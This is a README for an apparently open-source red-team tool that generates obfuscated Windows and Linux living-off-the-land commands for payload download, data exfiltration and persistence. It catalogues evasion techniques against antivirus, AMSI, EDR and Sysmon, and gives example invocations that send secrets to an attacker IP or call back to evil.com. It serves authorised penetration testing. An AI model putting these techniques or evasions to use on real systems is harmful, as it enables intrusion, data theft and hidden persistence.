# LOL-Exfiltrator ⚔️

A next-generation Red Team & Penetration Testing CLI tool that generates clear and heavily obfuscated commands leveraging Windows (**LOLBAS**) and Linux (**GTFOBins**) binaries for **Payload Download (Ingress)**, **Data Exfiltration (Egress)**, and **Persistence**.

---

## 📸 Preview

![preview](assets/preview.png)

---

## ✨ Features

- 🎯 **70 Built-in Techniques**: 32 Windows LOLBAS + 38 Linux GTFOBins vectors.
- 🛡️ **21 Obfuscation & Evasion Methods**: Multi-tiered evasion defeating Antivirus, AMSI, EDR parent-child heuristics, Sysmon Event ID 1, and Network IDS/IPS.
- ⚡ **3 Operational Actions**:
  - 📥 **Download (Ingress)**: Drop stagers, scripts, or executables stealthily.
  - 📤 **Upload (Exfiltration)**: Exfiltrate files via HTTP/S, TCP sockets, SMB, TLS, DNS queries, and custom protocols.
  - 🔄 **Persistence**: Maintain presence via Registry, Tasks, Services, WMI, COM Hijacks, Crontab, Systemd, SSH hooks, and more.
- 👤 **Privilege & Risk Indicators**: Real-time tags for privilege requirements (`USER`, `ADMIN`, `SYSTEM`) and detection likelihood (`LOW`, `MEDIUM`, `HIGH`).
- 🎨 **Rich Terminal UI & Interactive Wizard**: Step-by-step interactive mode with rich colored formatting powered by `colorama`.
- 🔍 **Granular Filtering**: Filter by specific binary (`--binary certutil`, `--binary nc`), target OS, or attack phase.

---

## 📊 Technique Matrix

### 🪟 Windows (LOLBAS) — 32 Techniques

| Phase | Binary | Technique Description | Privilege | Detection Risk |
|---|---|---|---|---|
| **Download** | `certutil` | URL cache download & split | `USER` | 🟡 Medium |
| **Download** | `bitsadmin` | BITS Background Transfer Service | `USER` | 🟢 Low |
| **Download** | `powershell` | In-memory WebClient download (`-nop -w hidden`) | `USER` | 🔴 High |
| **Download** | `curl` | Native Windows 10+ curl utility | `USER` | 🟢 Low |
| **Download** | `xcopy` | SMB share download (`/Q /H`) | `USER` | 🟢 Low |
| **Download** | `regsvr32` | Remote SCT COM Scriptlet (Squiblydoo AppLocker bypass) | `USER` | 🟡 Medium |
| **Download** | `msiexec` | Remote MSI installer execution | `USER` | 🟡 Medium |
| **Download** | `rundll32` | URLmon `URLDownloadToFileA` execution | `USER` | 🟡 Medium |
| **Download** | `esentutl` | Jet Database engine file copy | `USER` | 🟢 Low |
| **Download** | `hh.exe` | Microsoft HTML Help remote CHM fetch | `USER` | 🟡 Medium |
| **Download** | `cmstp` | Connection Manager INF profile execution | `USER` | 🟢 Low |
| **Download** | `expand` | Remote UNC Cabinet archive extraction | `USER` | 🟢 Low |
| **Download** | `powershell` | `Invoke-RestMethod` file download | `USER` | 🟡 Medium |
| **Download** | `powershell` | `Start-BitsTransfer` cmdlet transfer | `USER` | 🟢 Low |
| **Upload** | `powershell` | Outbound HTTP POST exfiltration | `USER` | 🟡 Medium |
| **Upload** | `certutil` | Base64 encode + HTTP PUT transfer | `USER` | 🟡 Medium |
| **Upload** | `bitsadmin` | BITS asynchronous HTTP PUT upload | `USER` | 🟢 Low |
| **Upload** | `ftp` | Automated anonymous FTP exfiltration | `USER` | 🟡 Medium |
| **Upload** | `xcopy` | SMB share data exfiltration | `USER` | 🟢 Low |
| **Upload** | `certreq` | Certificate Request HTTP POST exfiltration | `USER` | 🟢 Low |
| **Upload** | `curl` | Native multipart POST exfiltration | `USER` | 🟢 Low |
| **Upload** | `powershell` | `Invoke-RestMethod` POST exfiltration | `USER` | 🟡 Medium |
| **Upload** | `makecab` | Compressed CAB archive + HTTP POST exfiltration | `USER` | 🟢 Low |
| **Persistence** | `reg` | HKCU CurrentVersion Run key | `USER` | 🟡 Medium |
| **Persistence** | `schtasks` | Scheduled Task (`/sc onlogon /rl highest`) | `ADMIN` | 🟡 Medium |
| **Persistence** | `wmic` | WMI Process Call execution | `ADMIN` | 🟡 Medium |
| **Persistence** | `mshta` | Remote HTA payload via Run key | `USER` | 🔴 High |
| **Persistence** | `netsh` | Netsh Helper DLL persistence | `ADMIN` | 🟡 Medium |
| **Persistence** | `sc` | Auto-start Windows Service | `ADMIN` | 🟡 Medium |
| **Persistence** | `reg` | Winlogon Userinit deep-system persistence | `SYSTEM` | 🔴 High |
| **Persistence** | `powershell` | Startup folder `.lnk` shortcut creation | `USER` | 🟢 Low |
| **Persistence** | `reg` | User-level COM Object Hijack (`InprocServer32`) | `USER` | 🟢 Low |

---

### 🐧 Linux (GTFOBins) — 38 Techniques

| Phase | Binary | Technique Description | Privilege | Detection Risk |
|---|---|---|---|---|
| **Download** | `curl` | Silent download with connection timeout | `USER` | 🟢 Low |
| **Download** | `wget` | Background quiet download | `USER` | 🟢 Low |
| **Download** | `python3` | One-line in-memory `urllib.request` fetch | `USER` | 🟡 Medium |
| **Download** | `bash` | Pure `/dev/tcp` socket + `sed` header stripping | `USER` | 🟢 Low |
| **Download** | `nc` | Netcat raw TCP stream pull | `USER` | 🟡 Medium |
| **Download** | `openssl` | TLS-encrypted socket download | `USER` | 🟢 Low |
| **Download** | `scp` | Encrypted SSH remote copy | `USER` | 🟢 Low |
| **Download** | `socat` | Bidirectional TCP relay transfer | `USER` | 🟢 Low |
| **Download** | `php` | PHP CLI stream wrapper download | `USER` | 🟡 Medium |
| **Download** | `ruby` | Ruby `Net::HTTP` stdlib download | `USER` | 🟡 Medium |
| **Download** | `perl` | Perl `LWP::Simple` web fetch | `USER` | 🟢 Low |
| **Download** | `rsync` | Remote rsync daemon sync | `USER` | 🟢 Low |
| **Download** | `tftp` | Trivial FTP UDP transfer | `USER` | 🟡 Medium |
| **Download** | `lwp-download` | Standalone Perl LWP utility | `USER` | 🟢 Low |
| **Download** | `busybox` | Minimalist Busybox wget applet | `USER` | 🟢 Low |
| **Upload** | `curl` | Multipart HTTP POST exfiltration | `USER` | 🟡 Medium |
| **Upload** | `nc` | Raw TCP pipe exfiltration | `USER` | 🟡 Medium |
| **Upload** | `openssl` | TLS-encrypted raw socket exfiltration | `USER` | 🟢 Low |
| **Upload** | `python3` | Base64 encode + HTTP POST upload | `USER` | 🟡 Medium |
| **Upload** | `scp` | Encrypted SSH file transfer | `USER` | 🟢 Low |
| **Upload** | `bash` | Pure `/dev/tcp` raw socket egress | `USER` | 🟢 Low |
| **Upload** | `curl` | Base64 chunked DNS / Host-header exfil | `USER` | 🟢 Low |
| **Upload** | `socat` | Bidirectional TCP socket egress | `USER` | 🟢 Low |
| **Upload** | `tar` | On-the-fly Gzip compression + Netcat stream | `USER` | 🟢 Low |
| **Upload** | `whois` | Base64 whois protocol query exfil | `USER` | 🟢 Low |
| **Upload** | `rsync` | Compressed rsync upload | `USER` | 🟢 Low |
| **Upload** | `php` | PHP cURL HTTP POST upload | `USER` | 🟡 Medium |
| **Upload** | `xxd` | Hex-dump pipe + Netcat exfiltration | `USER` | 🟢 Low |
| **Persistence** | `crontab` | `@reboot` user crontab entry | `USER` | 🟡 Medium |
| **Persistence** | `bash` | Background `nohup` execution in `~/.bashrc` | `USER` | 🟡 Medium |
| **Persistence** | `systemctl` | User-level Systemd daemon service | `USER` | 🟡 Medium |
| **Persistence** | `ssh` | Backdoor key in `~/.ssh/authorized_keys` | `USER` | 🟢 Low |
| **Persistence** | `bash` | `LD_PRELOAD` shared library injection | `USER` | 🔴 High |
| **Persistence** | `at` | One-shot `at` queue job execution | `USER` | 🟢 Low |
| **Persistence** | `ssh` | Early SSH login hook via `~/.ssh/rc` | `USER` | 🟢 Low |
| **Persistence** | `bash` | XDG desktop session autostart entry | `USER` | 🟢 Low |
| **Persistence** | `bash` | Root boot-time script via `/etc/rc.local` | `ADMIN` | 🟡 Medium |
| **Persistence** | `git` | Git repository `post-checkout` hook | `USER` | 🟢 Low |

---

## 🛡️ Obfuscation Engine (21 Strategies)

LOL-Exfiltrator includes 3 tiers of evasion techniques to defeat modern defensive stacks:

### 🔹 Tier 1: Basic Evasions
- `env_var`: `%SystemRoot%` path substitution + empty quote injection (`c""ertutil`) + Hex IP.
- `caret`: Cmd.exe caret escaping (`c^e^r^t^u^t^i^l`).
- `quote`: Empty quote pair injection.
- `ps_tick`: PowerShell backtick insertion (`Inv`oke-WebR`equest`).
- `ps_iex`: String splitting + `Invoke-Expression` reconstruction.
- `ps_b64`: UTF-16LE Base64 `-EncodedCommand`.
- `env_concat`: Linux shell variable splitting (`a=cu; b=rl; $a$b`).
- `hex_ip` / `dec_ip`: IP address conversion to Hex (`0xC0A80101`) or 32-bit Integer (`3232235777`).
- `unicode`: URL path percent-encoding (`cu%72l`).
- `b64_bash`: Base64 piping to `bash`.
- `reverse`: Reversed string pipeline (`echo ... | rev | bash`).

### 🔹 Tier 2: Advanced EDR / SIEM Evasions
- `wmi_spawn`: Executes via `Win32_Process.Create()` — breaks Parent-Child PID process tree heuristics (`WmiPrvSE.exe` is creator).
- `ps_secure`: XOR + Base64 in-memory runtime decryption bypassing static AMSI scanners.
- `stdin_pipe`: Base64 decode to Stdin — Sysmon Event ID 1 logs show an empty `cmd /s` command line!
- `forfiles_proxy`: Proxy execution via signed Microsoft `forfiles.exe`.
- `xxd_hex` / `bash_hex`: Pure hexadecimal byte sequences (`$'\x63\x75...'`) with zero plaintext keywords.
- `openssl_aes`: Real-time AES-256-CBC encryption pipeline decrypted on the fly.
- `multi_var`: Full command 3-5 character variable chunking.
- `awk_chr` / `perl_eval`: Character decimal reconstruction via `awk printf` and Perl `pack()`.
- `multilayer_win` / `multilayer_lin`: Cascaded multi-layer obfuscation stacks.

### 🔹 Tier 3: Modern Evasion Innovations
- `ps_amsi_bypass`: In-memory .NET reflection AMSI disabling (`amsiInitFailed = true`) before payload decode.
- `cmd_comma_sep`: Comma/semicolon argument separator replacement defeating whitespace-based regex log parsers.
- `ps_download_cradle`: XOR byte decryption + char-array constructed `IEX` execution.
- `double_b64`: Double-round Base64 encoding defeating single-pass automated decoders.
- `python_exec`: Trusted `python3` `os.system()` wrapper.
- `wget_pipe`: Remote script execution pipeline with zero local argument traces.

---

## 🚀 Installation & Setup

```bash
# Clone the repository
git clone https://github.com/HamzaKhan-Cyber/LOL-Exfiltrator.git
cd LOL-Exfiltrator

# Install dependencies
pip install -r requirements.txt
```

---

## 📖 Usage Guide

### 1. Interactive Mode (Wizard)
Simply run without arguments to launch the step-by-step interactive assistant:
```bash
python lol_exfiltrator.py
```

### 2. CLI Command Mode

```bash
# General syntax
python lol_exfiltrator.py --os <windows|linux> --action <download|upload|persistence> --ip <IP/Domain> --port <PORT> --filename <FILE>
```

#### Key Arguments:
- `--os`, `-O`: Target OS (`windows` or `linux`)
- `--action`, `-a`: Attack phase (`download`, `upload`, or `persistence`)
- `--ip`, `-i`: Attacker IP address or callback domain name
- `--port`, `-p`: Listening port (Default: `8080`)
- `--filename`, `-f`: Target filename to transfer or execute
- `--binary`, `-b`: Filter by a specific binary (e.g. `esentutl`, `certreq`, `socat`, `nc`)
- `--obf-technique`, `-t`: Choose an obfuscation strategy (Default: `auto`)
- `--list`, `-l`: Catalogue all techniques for a given OS and Action

---

## 💡 Practical Examples

#### Scenario 1: Windows Payload Staging with AMSI Bypass
```bash
python lol_exfiltrator.py --os windows --action download --ip 10.10.10.10 --port 8080 --filename agent.exe --obf-technique ps_amsi_bypass
```

#### Scenario 2: Stealthy Linux Exfiltration using Hex Dump & Netcat
```bash
python lol_exfiltrator.py --os linux --action upload --ip 10.0.0.1 --port 4444 --filename secrets.tar.gz --binary xxd
```

#### Scenario 3: Obscure Windows Persistence via COM Object Hijack
```bash
python lol_exfiltrator.py --os windows --action persistence --ip evil.com --port 443 --filename backdoor.dll --binary reg
```

#### Scenario 4: Linux Persistence using Desktop Autostart & Double Base64
```bash
python lol_exfiltrator.py --os linux --action persistence --ip 192.168.1.50 --port 8000 --filename payload.sh --obf-technique double_b64 --binary bash
```

#### Scenario 5: Full Technique Catalogue View
```bash
python lol_exfiltrator.py --list
```

---

## 📁 Project Architecture

```
LOL-Exfiltrator/
├── lol_exfiltrator.py        # CLI parser & interactive workflow controller
├── requirements.txt          # Python dependencies (colorama, cryptography)
├── commands/
│   ├── __init__.py           # TechniqueEntry dataclass schema & validator
│   ├── windows_lolbas.py     # 32 Windows LOLBAS technique definitions
│   └── linux_gtfobins.py     # 38 Linux GTFOBins technique definitions
└── core/
    ├── models.py             # Internal data models & template rendering
    ├── validators.py         # Network targets, ports, and path sanitization
    ├── display.py            # Terminal banners, color schemes & metadata display
    └── obfuscator.py         # 21-method multi-tier obfuscation engine
```

---

## ⚠️ Disclaimer

This tool is designed exclusively for **authorized security testing, penetration testing, Red Team engagements, and educational CTF challenges**. Unauthorized access or use against systems without explicit prior permission is strictly illegal.
